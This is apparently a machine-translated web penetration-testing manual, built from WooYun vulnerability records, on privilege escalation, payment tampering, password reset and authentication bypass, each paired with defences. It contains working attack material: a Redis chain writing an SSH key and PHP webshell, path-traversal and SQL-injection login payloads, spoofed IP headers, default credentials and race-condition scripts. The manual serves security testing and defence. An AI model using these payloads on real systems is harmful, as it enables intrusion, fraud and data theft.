# WebLogic and Authentication Security

> **Source**: Based onWooYunVulnerability database88,636Extracting real vulnerabilities, covering logical flaws(8,292Individual)and unauthorized access(14,377Individual)Two major categories
> **Purposes**: WebPractical reference manual for logical vulnerabilities and authentication bypass in application security testing

---

## One、Privilege escalation vulnerability

### 1.1 Nature of vulnerabilities

The root cause of privilege escalation vulnerabilities is**Authorization Verification Missing or Incomplete**——The server does not verify each requester's corresponding permissions during every resource operation.

| Type | Definition | Root cause | Risk level |
|------|------|------|----------|
| Horizontal privilege escalation | Cross-border access between peer users | Unverified resource ownership | High |
| Vertical privilege escalation | Low privilege execution of high privilege operations | Unverified role permissions | Severe |

### 1.2 Horizontal privilege escalation(IDOR)

**High-frequency scenarios and utilization methods**:

```
Scene1: IDtraverse——Auto-incrementIDLeading to predictability
GET /address/edit/?addid=100001  → Your own address
GET /address/edit/?addid=100002  → Others' addresses(Overstepping authority)

Scene2: Resource replacement attack——Modification operation lacks ownership verification.
AccountACreate invoiceID=1001 → AccountBReplace on ModificationID=1001 → AThe invoice is overwritten

Scene3: APIParameter traversal——The interface only verifies login and does not verify permissions
/personal/center/family/{id}/edit → ReplaceidLeakage of others' information
```

**Test method**:
1. Capture packets record in normal requestsIDParameters(uid/orderId/addidEtc.)
2. Replace with other users’ID, Observe Response
3. Automated Traversal(Burp Intruderor scripts)
4. Focus on the four types of operations: create, read, update, and delete, with modifications and deletions being the most harmful

```python
# IDORAutomated detection approach
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "Sensitive data characteristics" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**Privilege escalation testing matrix**:

| Operation type | Test method | Risk level |
|----------|----------|----------|
| View | Replace resourcesID | In |
| Modify | Replace resourcesID+Data | High |
| Delete | Replace resourcesID | Severe |
| Create | Replace attributed userID | High |

### 1.3 Vertical privilege escalation

**Core utilization methods**:

```http
# Ordinary users tamper with role identification when modifying information
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 Regular user

# Tampered to administrator
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 Super administrator
```

**Detection highlights**:
- Enumerate rolesID: Usually 1=Super administrator, 2=Administrator, 3+=Regular user
- Test role switching: Modify role identifier in requests(role/aid/type/level)
- Low privilege accounts directly accessing admin interfacesURL
- Tamper with permission identifiers: `isAdmin=0->1`, `role=user->admin`

### 1.4 Defensive measures

- Force Ownership Verification Before Resource Access: `WHERE id=? AND user_id=Current user`
- UseUUIDAlternative auto-incrementID, prevent enumeration
- Audit Log for Sensitive Operation Records
- Implement the principle of least privilege, back-end authentication per interface
- Permission verification logic centralized management(Middleware/Interceptor)

---

## Two、Payment logic vulnerability

### 2.1 Nature of vulnerabilities

The core of payment vulnerabilities is**Trust boundary errors**——Sensitive logic such as price calculation is pushed down to the client side, and the server side does not independently verify.

```
Security model: Untrusted zone(Client) -> Trust boundaries -> Trusted zones(Server side.)
Incorrect implementation: Directly accept the price submitted by the client as a factual basis
Correct implementation: Client only provides goodsID, server-side independent price calculation
```

### 2.2 Common Scenarios and Utilization Techniques

**Scene1: Direct amount tampering**

```http
# Original request
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# Tamper with requests
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**Scene2: Coupons/Discount logic abuse**

```
1. Purchase GoodsA(59Yuan), trigger"Full59Exchange purchaseB(5.9Yuan)"
2. Place an orderA+B, payment64.9Yuan
3. Cancel goodsA, retaining onlyB
4. Actually at5.9Buy back at original price21Goods worthB

Testing ideas: Partial cancellation after combining orders、Return after coupon use、Refund after points redemption
```

**Scene3: Virtual currency brushing**
- Register and promote to earn points -> Brute force cracking of verification codes for batch registration -> Points redeem for physical items

**Scene4: Quantity/Negative Attack**
- `count=1 -> count=-1` (Negative numbers result in refunds)
- `price=100 -> price=-100` (Negative amount)

### 2.3 Systematic Testing Methods

```
Phase 1: Parameter fingerprinting
  - Packet capture order creation interface
  - Identify price parameters(price/amount/total/cost/discount)
  - Determine parameter types(Integer/Floating point/String)

Phase 2: Boundary value testing
  - Minimum value.: 0, 0.01
  - Negative number: -1, -100, -0.01
  - Format: Scientific notation(1e-10), JSONNested
  - Accuracy: Floating Point Overflow, Rounding Error

Phase 3: Logic bypass
  - Parameter Redundancy: Submit multiplepriceParameters
  - Parameter overwrite: Price increase followed by price decrease
  - Coupon stacking: Price+Discount Double Manipulation
  - Partial cancellation after combining orders/Return

Phase 4: Verification of each stage of the payment process
  - Order generation -> Check order amount
  - Payment redirection -> Verify payment amount
  - Payment callback -> Forged callback signature
  - Refund process -> Check refund amount
```

**Advanced exploitation techniques**:

```python
# Price manipulation+Concurrent competition
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# Parameter pollution: Some frameworks handles duplicate parameters
POST /order/create?price=299.00&price=0.01

# Type conversion bypass
{"price":"0.01"}     String
{"price":1e-10}      Scientific notation
{"price":null}       NULLInjection
```

### 2.4 Defensive measures

```
Layer 1 Input Validation: Only accept goodsIDNot acceptedprice; Amount positive integer at most2Decimal places
Layer 2 Business logic: Server-side independent pricing; Reject when price deviates from threshold/Manual review
Layer 3 Data integrity: Order signature(HMAC)Anti-tampering; Timestamp replay protection; Idempotence to prevent duplication
Layer 4 Payment verification: callback amount=Order Amount; Strict state machine; Full-link audit log
```

---

## Three、Password reset vulnerability

### 3.1 Nature of vulnerabilities

The essence of the password reset vulnerability is**Break in Authentication Chain**——A certain step in the reset process did not correctly bind the user identity.

### 3.2 Four Major Vulnerability Patterns

**PatternA: CAPTCHA echo leakage**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# Directly includes the verification code in the response
{"code":0,"data":{"verifyCode":"123456"}}
```

Detection method: Intercept and send verification code response packets, search4-6Digit.

**PatternB: CAPTCHA unbinding with user**

```
1. Receive the verification code with your own phone numberA
2. initiate password recovery for the target account
3. Use of CAPTCHAAComplete Verification(Unbound user identity)
Root cause: Captchas only verify validity, not user ownership
```

**PatternC: Reset steps can be skipped**

```
Normal: Enter account -> Authentication -> Reset password -> Complete
Attack: Enter account -> [Skip] -> Direct access to the password reset page

Implementation Method:
1. Analyze frontendJS, find each stepURL
2. Direct access to3StepURL
3. F12ModifyDOM: Hide validation steps, display reset steps
```

**PatternD: Credential Parameters Are Controllable**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# Vulnerability: usernameFrom the client, can be tampered with by any user
```

### 3.3 Testing Process

```
Initiate password reset
  +-- Packet Capture Analysis Response -> Does it contain a captcha? -> PatternA
  +-- Analyze Verification Process
  |     +-- Multi-step -> Attempt to skip intermediate steps -> PatternC
  |     +-- Single step -> Check parameter binding
  |           +-- UserIDControllable -> Parameter tampering -> PatternD
  |           +-- BindSession -> SessionFixed testing
  +-- CAPTCHA mechanism
        +-- Whether the verification code is bound to the user -> PatternB
        +-- Can the verification code be brute-forced(No frequency limitation)
        +-- Check if the verification code has a validity period
```

### 3.4 Defensive measures

- Captcha Binds UserSession, verify ownership
- CAPTCHA valid for one use+60Second expiration
- ResetTokenOne-time use, unpredictable
- Whole process server state verification, prohibited stepping
- Failure5Secondary lock, anti-brute force

---

## Four、Business logic flaws

### 4.1 Nature of vulnerabilities

Root cause matrix of business logic flaws:

| Hierarchy | Defect types | Typical manifestations |
|------|----------|----------|
| Business layer | Process design flaw | Steps can be skipped、Status can be spoofed |
| Interface layer | Overtrust in parameters | Client-side validation、Server-side unverified |
| Authentication layer | Credential Management Flaw | TokenDisclosure、SessionFixed |
| Authorization layer | Ambiguous Permission Boundaries | Level/Vertical privilege escalation |

### 4.2 CAPTCHA bypass

**Bypass Method1: Verification code does not refresh**
- Captcha does not refresh automatically after login failure, the same captcha can be reused
- Utilize: Manual identification once, fixed verification code brute-force password cracking

**Bypass Method2: Captchas can be brute-forced**
- 4-6Purely numeric, no counts/Frequency Limitation
- Brute Force Space10000-1000000,30thread about30Completed in seconds

**Bypass Method3: Frontend validation**
- Verification code is only on the frontendJSVerification, deleting front-end validation code or directly calling interfaces can bypass it.

**CAPTCHA security detection checklist**:
- Whether the verification code is leaked in the response
- Whether withSession/User binding
- Is there a time sensitivity(Suggestions60Seconds)
- Whether verification failure forces refresh
- Is there a frequency limit?(Suggestions5Times/Minutes)
- Is the complexity sufficient(Suggestions6Bit Alphanumeric Mix)

### 4.3 Race Condition(Race Condition)

Applicable scenarios: Coupon Usage、Points redemption、Inventory deduction、Balance payment

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# Concurrency100Times, attempting multiple times to redeem the same points
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

Root cause: Checking balance and deducting balance are not atomic operations, and can be checked multiple times concurrently.

### 4.4 Systematic method for parameter tampering

| Parameter Types | Tampering direction | Example |
|----------|----------|------|
| UserID | Replace with another user | uid=1001->1002 |
| Amount | Reduce/Reset/Negative number | price=100->0.01 |
| Quantity | Negative number | count=1->-1 |
| Status | Flip boolean value | isPaid=false->true |
| Role | Elevate permissions | role=user->admin |
| Time | Extend Validity Period | expireTime->2099-12-31 |

### 4.5 Business Process Reverse Analysis Method

```
Steps1: Draw the complete business process diagram
Steps2: Identify checkpoints in each link
Steps3: Assess whether the check can be bypassed(Front-end/Backend? Replayable? Parameter Controllable?)
Steps4: Design Bypass Test Cases

Example(Password reset process):
[Enter account] -> [Send Verification Code] -> [Verify identity] -> [Set new password]
     |              |              |              |
  Account enumeration      CAPTCHA leakage      Step Skipping      Parameter tampering
```

### 4.6 Defense Principle

- **Server-side authority**: All checks are completed on the server side, front-end checks are only forUX
- **Atomic operation**: Critical business(Deduction/Inventory)Use transactions+Lock
- **State machine**: Business processes must strictly advance according to state machine, no skipping steps
- **Anti-replay**: Idempotent Design of Key Interfaces, Requests with Timestamps+Signature

---

## Five、Authentication bypass

### 5.1 Nature of vulnerabilities

The core of authentication bypass is**Trust chain is broken**: The system mistakenly trusted identity claims from untrusted sources.

### 5.2 Cookie/SessionForgery

```
# Direct writeCookieObtain identity
GET /registeruser/CookInsert?userAccount=admin&inner=1
-> ToCookieWriteadminIdentity, directly obtaining administrator accessSession

# CookieIdentity identifiers in
Cookie: admin=true; userId=1
-> ModifyCookieValues can switch identities
```

JWTBypass:

| Technology | Payload |
|------|---------|
| Null algorithm | alg: none |
| Weak Key | Brute force crackingHS256Key |
| Algorithm obfuscation | RS256TransferHS256, signed with a public key |

### 5.3 Response Tampering Bypass

```
Normal: Request validation -> {"status":"0","msg":"CAPTCHA error"} -> Stay on Verification Page
Attack: Request validation -> Intercept response -> Change to{"status":"1","msg":"Success"} -> Proceed to the next step
```

Applicable conditions: Client controls the process based on response status+Subsequent steps on the server do not re-verify.

### 5.4 IPForgery/HeaderBypass

```http
# BypassIPCommon whitelistHeader
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 Path bypass

```
# Case mixing confusion
/ADMIN/  /Admin/  /aDmIn/

# URLEncoding bypass
%2e%2e%2f = ../
%252e%252e%252f = ../ (Double encoding)

# Null byte truncation
../../../etc/passwd%00.jpg

# Suffix Addition Bypass
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6 Unauthorized Access to Background

High-frequency unauthorized paths:

```
# WebMiddleware
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, May leak passwords)

# APIInterface
/swagger-ui.html       (APIDocument)
/api-docs              (APIDocument)
/api/configs           (Configuration leakage)

# Debug/Management
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (DruidMonitoring)
```

Middleware weak password quick check:

| Middleware | Common weak passwords |
|--------|-----------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin(or no authentication) |

### 5.7 Database/Service unauthorized

| Service | Port | Validate command | Utilization method |
|------|------|----------|----------|
| Redis | 6379 | redis-cli -h IP info | WriteSSHPublic key/Webshell/Scheduled tasks |
| MongoDB | 27017 | mongo IP:27017 | Unauthenticated direct connection to export all data |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | Read index data |
| Memcached | 11211 | echo stats, nc IP 11211 | Data leakage |
| Docker API | 2375 | curl IP:2375/info | Container escape/RCE |

RedisUnauthorized exploitation chain(High risk):

```bash
redis-cli -h target
# WriteSSHPublic key
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# WriteWebshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 SessionBypass

```
# Session IDDisclosure(Log/URL)
/logs/ctp.log -> ContainSession ID -> Directly use

# SessionFixed attack
Force users to use attacker-specifiedSession ID

# SessionPrediction
Timestamp/Weakness in sequence number generationSession -> Predictable nextSession
```

### 5.9 Universal Password(SQLInject login)

```
Username: ' or 1=1--
Password:   Any

Username: admin'--
Password:   Any
```

### 5.10 Authentication bypass test checklist

| Test items | Method | Tool |
|--------|------|------|
| CookieForgery | Modify user identifier fields | BurpSuite |
| SessionFixed | Reuse othersSession | Packet capture tool |
| Response tampering | Modify return status code | BurpSuite |
| IPForgery | AddX-Forwarded-For | curl/Burp |
| Frontend bypass | ModifyJSLogic | DevTools |
| JWTTamper | Null algorithm/Weak Key | jwt.io/hashcat |
| Path bypass | Case sensitivity/Code/Truncate | Manual+Dictionary |
| Weak Passwords | Default credential attempt | Hydra |
| SQLInject login | Universal Password | Manual |

### 5.11 Defensive measures

| Aspect | Measures |
|------|------|
| Network | Internal network services are not exposed to the public network,VPN/Bastion host access |
| Authentication | Enforce complex passwords, disable default accounts, enableMFA |
| Authorization | Back-End Interface Permission Verification, Principle of Least Privilege |
| Session | Regenerate after logging inSessionID,HttpOnly+Secure |
| Monitoring | Abnormal login alert, lock on number of failures, log audit |
| Hardening | close debugging interfaces, delete default management pages |

---

## Six、Systematic testing framework

### 6.1 Four-Phase Testing Method

```
Phase 1: Intelligence collection
  - Enumerate all functional points and interfaces
  - Draw Business Process Flowchart
  - Identify sensitive operations(Payment/Reset/Permission change)
  - Determine the controllability of parameters

Phase 2: Threat modeling
  - Analyze the input parameters and trust boundaries of each interface
  - Tagging the Server Side vs Frontend validation
  - build attack tree(By privilege escalation/Payment/Authentication classification)
  - Priority sorting(High impact x High likelihood)

Phase 3: Vulnerability verification
  - Test Items by Priority
  - RecordPoC(Request/Response Screenshot)
  - Assess the impact scope(Data volume/Number of users/Amount)

Phase 4: Report Output
  - Vulnerability description+Reproduction steps
  - Root cause analysis+Impact Assessment
  - Fix recommendations(Short term+Long-term)
  - Risk Rating(CVSS)
```

### 6.2 High-Frequency Vulnerability Pattern Quick Check

| Vulnerability pattern | Detecting Signals | Quick verification method |
|----------|----------|-------------|
| IDOR | URL/Parameters contain self-incrementID | ReplaceIDCheck if it returns data from others |
| Amount tampering | Request containsprice/amount | Change to0.01Observe orders |
| CAPTCHA echo | Capture packets after sending the verification code | In search response4-6Bit digits |
| Step Skipping | Multi-step process | Direct access to subsequent stepsURL |
| Response tampering | Client based onstatusJump | Changestatus=1See if it is released |
| Unauthorized background | Directory Scan Discovered Management Path | Directly access to see if login is required |
| Weak Passwords | Discover login pages | Tryadmin/adminWait for default credentials |
| Race Condition | Balance/Inventory/Coupon operation | Concurrency50+Request to observe if multiple deductions |

### 6.3 Practical Tool Recommendations

| Tool | Core Use | Applicable scenarios |
|------|----------|----------|
| BurpSuite | Traffic interception、Parameter tampering、Replay | Core tools for all scenarios |
| Postman | APITesting、Batch requests | Interface logic testing |
| Hydra | Password cracking | Weak Passwords/Database collision |
| OWASP ZAP | Automated Scanning | Preliminary finding |
| Custom script | Concurrency Testing、IDtraverse | Competitive conditions/IDOR |

---

*Document version: v1.0*
*Data source: WooYunVulnerability database(88,636Item.): Logical flaws(8,292Item.)+Unauthorized access(14,377Item.)*
*Generation Time: 2026-02-06*
